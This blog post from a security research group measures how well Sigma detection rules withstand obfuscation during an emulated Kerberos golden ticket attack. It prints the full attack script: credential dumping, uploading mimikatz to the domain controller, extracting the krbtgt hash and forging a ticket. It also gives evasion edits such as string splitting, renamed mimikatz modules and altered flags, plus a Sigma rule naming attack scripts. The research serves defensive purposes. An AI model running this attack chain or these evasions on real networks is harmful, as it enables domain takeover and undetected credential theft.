<!doctype html><html lang=en dir=ltr><head><title>Outsmarting the Watchdog: How can Adversaries evade Sigma Rule Detection during a Kerberos Golden Ticket Attack? :: lolcads tech blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Introduction In the face of increasing amounts of cyber threats, organizations employ security information and event management (SIEM) systems as a way to collect and analyze information at a central place to detect and counteract against potential cyberattacks. One common way to detect malicious behavior using this information are Sigma rules and the corresponding Sigma detection format. Given that these rules are open source, attackers can check if their behavior is detected by them and might try to obfuscate their attacks to evade detection, e.g., by adapting used commands. Thus, it is important that these rules are robust to changes of the detected behavior - both malicious but also accidental.
"><meta name=keywords content="SIEM,ThreatDetection,Sigma"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://lolcads.github.io/posts/2025/01/evadingsigma/"><meta property="og:site_name" content="lolcads tech blog"><meta property="og:title" content="Outsmarting the Watchdog: How can Adversaries evade Sigma Rule Detection during a Kerberos Golden Ticket Attack?"><meta property="og:description" content="Signature-based threat detection helps to timely detect malicious behavior. This blog post shows that during an exemplary cyber attack, 99.99% of alerts generated using the well-known Sigma rules can be successfully evaded using fairly straight-forward techniques."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-01-14T10:00:00+02:00"><meta property="article:modified_time" content="2025-01-14T10:00:00+02:00"><meta property="article:tag" content="SIEM"><meta property="article:tag" content="ThreatDetection"><meta property="article:tag" content="Sigma"><meta name=twitter:card content="summary"><meta name=twitter:title content="Outsmarting the Watchdog: How can Adversaries evade Sigma Rule Detection during a Kerberos Golden Ticket Attack?"><meta name=twitter:description content="Signature-based threat detection helps to timely detect malicious behavior. This blog post shows that during an exemplary cyber attack, 99.99% of alerts generated using the well-known Sigma rules can be successfully evaded using fairly straight-forward techniques."><link rel=canonical href=https://lolcads.github.io/posts/2025/01/evadingsigma/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.14211377552be17d56465ae537fca1a7e426b22c2c4ba496c85e278aaa470d24.css></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
<span class=sr-only>Open main menu</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Blog>Blog</a></li><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=contact><a class="block px-3 py-3 hover:text-emerald-600" href=/contact/ title=Contact>Contact</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/2025/01/evadingsigma/><figure><img class="w-full object-cover h-36 md:h-48 xl:h-60" src=/2025/01/evadingsigma_cover.png alt="Outsmarting the Watchdog: How can Adversaries evade Sigma Rule Detection during a Kerberos Golden Ticket Attack?" title="Outsmarting the Watchdog: How can Adversaries evade Sigma Rule Detection during a Kerberos Golden Ticket Attack?" loading=lazy></figure></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/2025/01/evadingsigma/>Outsmarting the Watchdog: How can Adversaries evade Sigma Rule Detection during a Kerberos Golden Ticket Attack?</a></h1><h2 class="my-4 text-large text-slate-600 dark:text-slate-300">Signature-based threat detection helps to timely detect malicious behavior. This blog post shows that during an exemplary cyber attack, 99.99% of alerts generated using the well-known Sigma rules can be successfully evaded using fairly straight-forward techniques.</h2><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/tags/siem/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>SIEM</span></a></li><li><a href=/tags/threatdetection/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>ThreatDetection</span></a></li><li><a href=/tags/sigma/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Sigma</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
</i><time datetime=2025-01-14T10:00:00+02:00>2025-01-14</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
</i><span>9 minutes to read</span></div></div><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-user"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 7a4 4 0 108 0A4 4 0 008 7"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
</i><span>Leon Vogel, Louis Hackländer-Jansen</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#emulating-a-realistic-attack>Emulating a Realistic Attack</a></li><li><a href=#obfuscation-techniques>Obfuscation Techniques</a><ul><li><a href=#file-renaming>File Renaming</a></li><li><a href=#command-line-substitution>Command-Line Substitution</a></li><li><a href=#command-line-insertion>Command-Line Insertion</a></li><li><a href=#customized-scripts>Customized Scripts</a></li><li><a href=#customized-executables>Customized Executables</a></li></ul></li><li><a href=#results>Results</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h2 id=introduction>Introduction</h2><p>In the face of increasing amounts of cyber threats, organizations employ security information and event management (SIEM) systems as a way to collect and analyze information at a central place to detect and counteract against potential cyberattacks.
One common way to detect malicious behavior using this information are <a href=https://sigmahq.io/docs/basics/rules.html target=_blank rel=noopener>Sigma rules</a>
and the corresponding Sigma detection format.
Given that these rules are open source, attackers can check if their behavior is detected by them and might try to obfuscate their attacks to evade detection, e.g., by adapting used commands.
Thus, it is important that these rules are robust to changes of the detected behavior - both malicious but also accidental.</p><p>The robustness of the Sigma rules has been previously analyzed <a href=https://www.usenix.org/conference/usenixsecurity24/presentation/uetz target=_blank rel=noopener>by Uetz et al.</a>
, where it was found that half of the ~300 considered rules were easily evadable.
The considered rules were a subset of rules, that act on process creation events and the evasion techniques focused mostly on their command lines.</p><p>In this blog post we want to explore an alternative approach, in which we take a look at a realistic attack, see which alerts are generated, and subsequently try to evade the rules responsible for the alerts.
As a result we devised five techniques, which cover both the command-line and PowerShell script contents.</p><p>This blog post summarizes the more practical aspects and key findings of our work, while shortening some of the more theoretical ones.
If you are interested in the details, you can take a look at the full <a href=https://github.com/ljvogel/report-obfuscation-of-a-golden-ticket-attack target=_blank rel=noopener>written report</a>
.</p><h2 id=emulating-a-realistic-attack>Emulating a Realistic Attack</h2><p>The first step was acquiring a realistic baseline of an attack.
To achieve this, we used executables and scripts from the <em>Center for Threat-Informed Defense</em>&rsquo;s <a href=https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/4a57b3dd5d28ad1bd79e927e04b20fd4d66934a0/apt29 target=_blank rel=noopener>APT 29 Adversary Emulation Library</a>
to realistically emulate a Kerberos golden ticket attack.
More specifically, we used the following tools and scripts:</p><ul><li><a href=https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1 target=_blank rel=noopener>PowerView</a></li><li>CredDump.ps1</li><li>Invoke-WinRMsession.ps1</li><li><a href=https://github.com/gentilkiwi/mimikatz target=_blank rel=noopener>Mimikatz</a></li><li><a href=https://github.com/g4uss47/Invoke-Mimikatz target=_blank rel=noopener>Invoke-Mimikatz</a></li></ul><p>For ease of use and better reproducibility, their usage was compiled into one additional script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ps data-lang=ps><span class=line><span class=cl><span class=nf>#</span> <span class=s>(1)</span> <span class=nf>Enumerate</span> <span class=nf>the</span> <span class=nf>domain</span> <span class=nf>controller</span> <span class=nf>to</span> <span class=nf>receive</span> <span class=nf>the</span> <span class=nf>domain</span> <span class=nf>name</span> <span class=nf>and</span> <span class=nf>the</span> <span class=nf>domain</span> <span class=nf>controller</span> <span class=nf>hostname</span>
</span></span><span class=line><span class=cl><span class=nf>.</span> <span class=nf>.\powerview.ps1;</span> <span class=nf>Get-NetDomainController</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>#</span> <span class=s>(2)</span> <span class=nf>Dump</span> <span class=nf>the</span> <span class=nf>domain</span> <span class=nf>admin&#39;s</span> <span class=nf>credentials</span> 
</span></span><span class=line><span class=cl><span class=nf>.</span> <span class=nf>.\creddump.ps1;</span> <span class=nf>wmidump</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>#</span> <span class=s>(3)</span> <span class=nf>Use</span> <span class=nf>the</span> <span class=nf>dumped</span> <span class=nf>credentials</span> <span class=nf>to</span> <span class=nf>upload</span> <span class=nf>mimikatz</span> <span class=nf>to</span> <span class=nf>the</span> <span class=nf>domain</span> <span class=nf>controller</span> <span class=nf>and</span> <span class=nf>dump</span> <span class=nf>the</span> <span class=nf>Kerberos</span> <span class=nf>credentials</span> 
</span></span><span class=line><span class=cl><span class=nf>.</span> <span class=nf>.\invoke-winrmsession.ps1;</span>
</span></span><span class=line><span class=cl><span class=nf>$session</span> <span class=nf>=</span> <span class=nf>invoke-winrmsession</span> <span class=nf>-Username</span> <span class=p>[</span><span class=nf>USERNAME</span><span class=p>]</span> <span class=nf>-Password</span> <span class=p>[</span><span class=nf>PASSWORD</span><span class=p>]</span> <span class=nf>-IPAddress</span> <span class=p>[</span><span class=nf>IP</span><span class=p>]</span><span class=nf>;</span>
</span></span><span class=line><span class=cl><span class=nf>Copy-Item</span> <span class=nf>m.exe</span> <span class=nf>-Destination</span> <span class=nf>&#34;C:\Windows\System32\&#34;</span> <span class=nf>-ToSession</span> <span class=nf>$session</span> <span class=nf>-force;</span>
</span></span><span class=line><span class=cl><span class=nf>Invoke-Command</span> <span class=nf>-Session</span> <span class=nf>$session</span> <span class=nf>-scriptblock</span> <span class=p>{</span><span class=nf>C:\Windows\System32\m.exe</span> <span class=nf>privilege::debug</span> <span class=nf>&#34;lsadump::lsa</span> <span class=nv>/inject</span> <span class=nv>/name:krbtgt&#34;</span> <span class=nf>exit</span><span class=p>}</span> <span class=nf>|</span> <span class=nf>out-string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>#</span> <span class=s>(4)</span> <span class=nf>Create</span> <span class=nf>the</span> <span class=nf>golden</span> <span class=nf>ticket</span>
</span></span><span class=line><span class=cl><span class=nf>klist</span> <span class=nf>purge;</span>
</span></span><span class=line><span class=cl><span class=nf>.</span> <span class=nf>.\Invoke-Mimikatz.ps1;</span>
</span></span><span class=line><span class=cl><span class=nf>invoke-mimikatz</span> <span class=nf>-command</span> <span class=nf>&#39;&#34;kerberos::golden</span> <span class=nv>/domain:</span><span class=p>[</span><span class=nf>DOMAIN</span><span class=p>]</span> <span class=nv>/sid:</span><span class=p>[</span><span class=nf>SID</span><span class=p>]</span>  <span class=nv>/rc4:</span><span class=p>[</span><span class=nf>HASH</span><span class=p>]</span> <span class=nv>/user:Administrator</span> <span class=nv>/ptt&#34;&#39;;</span>
</span></span><span class=line><span class=cl><span class=nf>klist;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>#</span> <span class=s>(5)</span> <span class=nf>Use</span> <span class=nf>the</span> <span class=nf>golden</span> <span class=nf>ticket</span> <span class=nf>to</span> <span class=nf>execute</span> <span class=nf>commands</span> <span class=nf>on</span> <span class=nf>another</span> <span class=nf>workstation</span>
</span></span><span class=line><span class=cl><span class=nf>invoke-command</span> <span class=nf>-ComputerName</span> <span class=p>[</span><span class=nf>NAME</span><span class=p>]</span> <span class=nf>-ScriptBlock</span> <span class=p>{</span> <span class=nf>ipconfig</span> <span class=nv>/all</span> <span class=p>}</span><span class=nf>;</span>
</span></span></code></pre></div><p>Lastly, the execution of scripts had to be allowed, using the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ps data-lang=ps><span class=line><span class=cl><span class=nf>Set-ExecutionPolicy</span> <span class=nf>-ExecutionPolicy</span> <span class=nf>Bypass</span>
</span></span></code></pre></div><h2 id=obfuscation-techniques>Obfuscation Techniques</h2><p>The baseline attack offered several possibilities for obfuscation, which we devided into five techniques.
In the following these obfuscation techniques will be discussed sorted by the amount of work involved when applying them in ascending order.
For each technique, a short example will be given, but we do not provide all performed obfuscations due to ethical concerns.
It should be noted that the two command-line techniques were adapted from <a href=https://www.usenix.org/conference/usenixsecurity24/presentation/uetz target=_blank rel=noopener>previous work done by Uetz et al.</a>
.</p><h3 id=file-renaming>File Renaming</h3><p>The first technique is really simple and might also be performed without malicious intent, as all that is done is changing some filenames.
Certain scripts&rsquo; filenames are detected in the &ldquo;context information&rdquo; of events by some rules, such as &ldquo;<em>Malicious PowerShell Scripts - PoshModule</em>&rdquo;:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=nt>detection</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>selection_generic</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>ContextInfo|contains</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>- <span class=l>...</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>- <span class=s1>&#39;Invoke-Mimikatz.ps1&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>- <span class=s1>&#39;PowerView.ps1&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>- <span class=l>...</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>condition</span><span class=p>:</span><span class=w> </span><span class=m>1</span><span class=w> </span><span class=l>of selection_*</span><span class=w>
</span></span></span></code></pre></div><p>The context information is logged for every PowerShell cmdlet executed within a script.
For the purpose of obfuscation, all we need to change are the names of the respective files.</p><h3 id=command-line-substitution>Command-Line Substitution</h3><p>Substitution of commands and flags was one of the techniques that was adopted from Uetz et al.
There are three different types of substitutions:</p><ol><li>Commands</li><li>Parameters/Flags</li><li>Flag prefixes</li></ol><p>Examples for each of these from the attack are:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># 1. Command substitution in main attack script &#34;Copy-Item&#34; --&gt; &#34;cp&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>cp </span><span class=n>m</span><span class=p>.</span><span class=n>exe</span> <span class=n>-Destination</span> <span class=s2>&#34;C:\Windows\System32\&#34;</span> <span class=n>-ToSession</span> <span class=nv>$session</span> <span class=n>-force</span><span class=p>;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># 2a. Parameter substitution &#34;Bypass&#34; --&gt; &#34;B&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Set-ExecutionPolicy</span> <span class=n>B</span> <span class=n>-Force</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># 2b. Flag substitution in main attack script &#34;-ComputerName&#34; --&gt; &#34;-Cn&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>invoke-command</span> <span class=n>-Cn</span> <span class=p>[</span><span class=no>NAME</span><span class=p>]</span> <span class=n>-ScriptBlock</span> <span class=p>{</span> <span class=n>ipconfig</span> <span class=p>/</span><span class=n>all</span> <span class=p>};</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># 3. Flag prefix substitution in CredDump &#34;-enc&#34; --&gt; &#34;/enc&#34;</span>
</span></span><span class=line><span class=cl><span class=n>powershell</span><span class=p>.</span><span class=py>exe</span> <span class=p>/</span><span class=n>enc</span> <span class=p>[</span><span class=no>Base64</span><span class=p>]</span>
</span></span></code></pre></div><p>Similarly to the renaming of files, obfuscations of this nature might also happen on accident, as most of these are also down to a personal preference.</p><h3 id=command-line-insertion>Command-Line Insertion</h3><p>Another technique that was adopted from Uetz et al. is the insertion of characters into commands.
Characters that were inserted in this work are quotation marks within flags, which generally works in PowerShell, because they are ignored when the command is executed.
An example from CredDump is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powershell</span><span class=p>.</span><span class=py>exe</span> <span class=p>-</span><span class=s2>&#34;&#34;</span><span class=n>enc</span> <span class=p>[</span><span class=no>Base64</span><span class=p>]</span>
</span></span></code></pre></div><p>Unlike the prior techniques, obfuscations of this type are most likely done with malicious intent and are unlikely to occur by chance.</p><h3 id=customized-scripts>Customized Scripts</h3><p>Similar to the file renaming technique, this technique does not consider the command-line.
Due to the large scope of the PowerView and Invoke-Mimikatz scripts, we decided to split this technique into three sub-techniques building upon each other.
The three sub-techniques are: code removal, identifier renaming, and code splitting.</p><p>The first of the sub-techniques was the removal of code not needed for the attack.
In particular, PowerView, with its vast collection of reconnaissance possibilities, includes a lot of code not needed during the emulated attack that is still generating alerts when the script was loaded.
By removing all of that code, approximately 99.7% of the PowerView script and 7.3% of the Invoke-Mimikatz script were removed (measured in LoC).</p><p>Following the removal of code, the identifiers detected by Sigma rules were renamed.
For example, one rule detects WinAPI functions like <code>OpenProcess</code> within script files, which can be evaded like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Before: Mentions of &#34;OpenProcess&#34; are detected</span>
</span></span><span class=line><span class=cl><span class=nv>$OpenProcessAddr</span> <span class=p>=</span> <span class=nb>Get-ProcAddress</span> <span class=n>kernel32</span><span class=p>.</span><span class=py>dll</span> <span class=n>OpenProcess</span>
</span></span><span class=line><span class=cl><span class=p>[...]</span>
</span></span><span class=line><span class=cl><span class=nv>$Win32Functions</span> <span class=p>|</span> <span class=nb>Add-Member</span> <span class=n>-Name</span> <span class=n>OpenProcess</span> <span class=n>-Value</span> <span class=nv>$OpenProcess</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># After: Change - where possible - &#34;OpenProcess&#34; to &#34;OpenProc&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$OpenProcAddr</span> <span class=p>=</span> <span class=nb>Get-ProcAddress</span> <span class=n>kernel32</span><span class=p>.</span><span class=py>dll</span> <span class=n>OpenProcess</span>
</span></span><span class=line><span class=cl><span class=p>[...]</span>
</span></span><span class=line><span class=cl><span class=nv>$Win32Functions</span> <span class=p>|</span> <span class=nb>Add-Member</span> <span class=n>-Name</span> <span class=n>OpenProc</span> <span class=n>-Value</span> <span class=nv>$OpenProc</span>
</span></span></code></pre></div><p>As demonstrated in the example, we can change things like variable names, object member names and (not shown) function names.</p><p>Although renaming the identifiers is already highly effective in evading many rules at once with just one <em>copy-and-paste</em>, there is still one mention of <code>OpenProcess</code> left, which we can not simply rename as it&rsquo;s needed to look up the address in the kernel32 DLL.
For cases like this, we can take advantage of the fact that most things in PowerShell can be done using strings, which we can first split into however many substrings we need to avoid detection, and then concatenate again.
This requires a bit more effort, but its flexibility allows for a very wide variety of obfuscation.
Using the previous example, the obfuscation can look something like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$OpenProcAddr</span> <span class=p>=</span> <span class=nb>Get-ProcAddress</span> <span class=n>kernel32</span><span class=p>.</span><span class=py>dll</span> <span class=vm>$</span><span class=p>(</span><span class=s2>&#34;Open&#34;</span> <span class=p>+</span> <span class=s2>&#34;Process&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>While the code removal might be performed without especially malicious intent, identifier renaming and code splitting are most likely performed with malicious intent.</p><h3 id=customized-executables>Customized Executables</h3><p>The final technique was specifically used for evading the detection of mimikatz modules and commands.
Mimikatz commands like <code>sekurlsa::logonpasswords</code> are used to show credentials of the logged-on users and are detected as malicious by certain rules.
Since mimikatz is open source, we can change the names of commands and modules to evade detection, and recompile the code to create our own customized version of mimikatz:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// Module name definition: sekurlsa --&gt; seklsa
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>const</span> <span class=n>KUHL_M</span> <span class=n>kuhl_m_sekurlsa</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=sa>L</span><span class=s>&#34;seklsa&#34;</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;SekurLSA module&#34;</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;Some commands to enumerate credentials...&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>[...]</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Command definition: logonPasswords --&gt; logonPw
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>const</span> <span class=n>KUHL_M_C</span> <span class=n>kuhl_m_c_sekurlsa</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span><span class=n>kuhl_m_sekurlsa_all</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;logonPw&#34;</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;Lists all available providers credentials&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>[...]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This technique requires the most effort and is performed with malicious intent.</p><h2 id=results>Results</h2><p>After introducing the different obfuscation techniques, we can apply them to the emulated attack and assess how good they perform with regard to obfuscation.
The following figure shows all techniques compared to the baseline attack, in order from least to most alerts evaded:</p><p><div class=not-prose><figure><img src=/2025/01/evadingsigma_results.png alt loading=lazy></figure></div></p><p>Running the unobfuscated baseline attack resulted in a total of 1564 alerts generated from 27 distinct rules.
This indicates that the Sigma rules, without any obfuscation applied, work generally well at detecting the golden ticket attack.</p><p>The three least effective techniques — command-line substitution, customized executable and command-line insertion — evaded 15, 35, and 49 alerts, respectively.
At first, this might seem like a rather low amount, but this is mostly due to the fact that the attack is very script-heavy and there was just not much application for the command-line techniques.
Similarly, the customized executable was tailored to a very small subset of alerts that target mimikatz.
Nevertheless, each of these techniques still played an important role in the overall obfuscation, as some of the rules evaded by these techniques, especially the mimikatz ones, were not evadable by any other technique.</p><p>Next up is the customized scripts technique, where it&rsquo;s starting to get more interesting.
The technique evaded a total of 363 alerts, making it reasonably efficient.
As we recall, the technique is further divided into three sub-techniques, so we can also take a look at the individual effectiveness.
The three sub-techniques — code removal, identifier renaming, and code splitting — evaded 249, 83, and 31 alerts respectively, showing that both of the <em>easier</em> techniques already evade a large quantity of alerts.</p><p>The by far most effective technique, in terms of the number of alerts evaded, is the simple renaming of files.
By renaming just two scripts, two distinct rules and a total of 1392 alerts have been evaded.
Furthermore, none of the alerts, evaded by this technique, are completely evadable by any other technique, making it essential to the attack obfuscation.</p><p>After combining all techniques, a total of 10 alerts are remaining, split up onto 5 distinct rules.
These alerts mostly stem from process creation events that occur when creating remote sessions for, e.g., uploading mimikatz to the domain controller.
This is necessary for the attack, and given the way the detection of these rules function, it is not evadable.
Other alerts originate from Windows-internal scripts, which likewise cannot be evaded.</p><h2 id=conclusion>Conclusion</h2><p>We developed and explored five techniques to obfuscate a golden ticket attack and evade detection by Sigma rules.
The results showed that even basic changes which do not have to be done with malicious intent, such as renaming a file, can remove around 90% of generated alerts.
Furthermore, most remaining alerts can be removed using more complex techniques that do, however, require a much higher invested amount of effort.
In total, 99.99% of the generated alerts could be evaded using relatively simple obfuscation techniques.</p><p>So, are Sigma rules useless?
No.
While this might look dire at first, we have to keep in mind that a lot has to go wrong to end up in an environment similar to that of the experiment.
